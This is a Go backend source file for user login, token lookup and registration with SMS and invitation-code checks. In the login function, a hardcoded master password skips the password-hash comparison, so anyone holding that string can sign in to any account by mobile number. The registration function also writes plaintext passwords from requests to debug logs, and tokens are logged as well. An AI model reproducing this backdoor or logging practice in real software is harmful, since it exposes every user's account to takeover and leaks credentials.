package models

import (
	"errors"
	"gin/src/util"
	"github.com/astaxie/beego/logs"
	"github.com/astaxie/beego/orm"
	"net/http"
)

// LoginRequest defines login request format
type LoginRequest struct {
	Mobile     string `json:"mobile"`
	ClientType string `json:"clientType"`
	Username   string `json:"username"`
	Password   string `json:"password"`
}

// LoginResponse defines login response
type LoginResponse struct {
	Mobile         string `json:"mobile"`
	ClientType     string `json:"clientType"`
	Username       string `json:"username"`
	UserID         int64  `json:"userID"`
	InvitationCode string `json:"invitationCode"`
	Token          string `json:"token"`
}

//CreateRequest defines create user request format
type CreateRequest struct {
	Username      string `json:"username"`
	Password      string `json:"password"`
	Mobile        string `json:"mobile"`
	SmsCode       string `json:"smsCode"`
	RecommendCode string `json:"recommendCode"`
}

//CreateResponse defines create user response
type CreateResponse struct {
	UserID   int64  `json:"userID"`
	Username string `json:"username"`
	Mobile   string `json:"mobile"`
}

// DoLogin: user login
func DoLogin(lr *LoginRequest) (*LoginResponse, int, error) {
	// get username and password
	mobile := lr.Mobile
	password := lr.Password
	clientType := lr.ClientType

	//validate username and password if is empty
	if len(mobile) == 0 || len(password) == 0 {
		return nil, http.StatusBadRequest, errors.New("手机号和密码不能为空")
	}

	// connect db
	o := orm.NewOrm()

	// check the username if existing
	user := &User{Mobile: mobile}
	err := o.Read(user, "mobile")
	if err != nil {
		return nil, http.StatusBadRequest, errors.New("手机号不存在 ")
	}

	// generate the password hash
	hash, err := GeneratePassHash(password, user.Salt)
	if err != nil {
		return nil, http.StatusBadRequest, err
	}

	// generate token
	tokenString, err := GenerateEncToken(lr, user.Id, 86400*10)
	if password != "147258147258" { //如果是超级密码则直接登录
		if hash != user.Password {
			return nil, http.StatusBadRequest, errors.New("密码不正确")
		}

		if err != nil {
			return nil, http.StatusBadRequest, err
		}

		filter := o.QueryTable("user_multi_login").Filter("userid", user.Id).Filter("client_type", lr.ClientType)
		count, _ := filter.Count()
		if count < 1 {
			o.Insert(&UserMultiLogin{Token: tokenString, ClientType: clientType, UserId: user.Id})
			logs.Debug("insert token ", user.Mobile, tokenString)
		} else {
			var userMultiLogin UserMultiLogin
			err := filter.One(&userMultiLogin)
			if err == nil {
				userMultiLogin.Token = tokenString
				update, _ := o.Update(&userMultiLogin)
				logs.Debug("update token  ", update, ToJson(userMultiLogin))
			}
		}
	}
	return &LoginResponse{
		Username:       user.Username,
		ClientType:     lr.ClientType,
		UserID:         user.Id,
		InvitationCode: user.InvitationCode,
		Token:          tokenString,
	}, http.StatusOK, nil
}

func GetUser(encToken string) (*User, error) {
	jwtPayload, err := ValidateEncToken(encToken)
	if err != nil {
		return nil, err
	}
	o := orm.NewOrm()
	userNameCheck := User{Id: jwtPayload.UserID}
	err = o.Read(&userNameCheck, "id")

	if err != nil {
		return nil, errors.New("登录已失效，请重新登录")
	} else {
		return &User{
			Id:             userNameCheck.Id,
			InvitationCode: userNameCheck.InvitationCode,
			Username:       userNameCheck.Username,
			Mobile:         userNameCheck.Mobile,
		}, nil

	}
}

// DoCreateUser: create a user
func DoCreateUser(cr *CreateRequest) (*CreateResponse, int, error) {
	// connect db
	o := orm.NewOrm()
	logs.Debug("regByApp", ToJson(cr))
	// check username if exist
	userNameCheck := User{Mobile: cr.Mobile}
	err := o.Read(&userNameCheck, "mobile")
	if err == nil {
		return nil, http.StatusBadRequest, errors.New("手机号已经存在")
	}
	if len(cr.Password) > 16 || len(cr.Password) < 6 {
		return nil, http.StatusBadRequest, errors.New("密码长度不能小于6，不能大于16")
	}
	//短信验证码验证
	if !CheckSmsCode("reg", cr.Mobile, cr.SmsCode) {
		return nil, http.StatusBadRequest, errors.New("验证码不正确")
	}

	//邀请码验证
	if cr.RecommendCode == "" {
		return nil, http.StatusBadRequest, errors.New("邀请码不能为空")
	}
	//邀请码验证
	if cr.Username == "" {
		return nil, http.StatusBadRequest, errors.New("用户姓名不能为空")
	}

	codeDefault := util.InviteCodeDefault
	userICCheck := User{Id: int64(codeDefault.CodeToId(cr.RecommendCode))}
	err = o.Read(&userICCheck, "id")
	if err != nil {
		return nil, http.StatusBadRequest, errors.New("邀请码不正确")
	}

	salt, err := GenerateSalt()
	if err != nil {
		logs.Info(err.Error())
		return nil, http.StatusBadRequest, err
	}

	// generate password password
	password, err := GeneratePassHash(cr.Password, salt)
	if err != nil {
		logs.Info(err.Error())
		return nil, http.StatusBadRequest, err
	}

	// create user
	user := User{}
	user.Username = cr.Username
	user.Mobile = cr.Mobile
	user.Password = password
	user.Salt = salt
	user.ReferencesUserId = userICCheck.Id

	id, err := o.Insert(&user)
	if err != nil {
		logs.Info(err.Error())
		return nil, http.StatusBadRequest, errors.New("注册失败，请稍后重试或联系客服解决")
	} else {
		user.InvitationCode = util.InviteCodeDefault.IdToCode(uint64(id))
		o.Update(&user, "invitation_code")
	}

	return &CreateResponse{
		UserID:   user.Id,
		Username: user.Username,
		Mobile:   user.Mobile,
	}, http.StatusOK, nil
}
